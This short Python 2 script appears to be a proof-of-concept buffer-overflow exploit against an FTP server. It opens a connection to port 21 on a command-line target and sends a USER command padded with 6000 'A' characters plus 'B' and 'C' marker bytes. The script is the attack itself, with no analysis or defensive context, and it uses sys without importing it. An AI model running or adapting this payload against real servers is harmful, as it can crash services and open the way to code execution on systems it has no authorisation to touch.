import socket
 
packet =""

try:
     
    packet+="A"*6000
    packet+="B"*8
    packet+="C"*8
    #packet+="D"*8
except:
    print "[-] Error.."
    sys.exit(0)
 
 
print "[+] Connecting to " + sys.argv[1]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((sys.argv[1],21))
print "[+] Sending payload"
s.send("USER " + packet + "\r\n")
print s.recv(1024)
s.send('QUIT \r\n')
s.close()
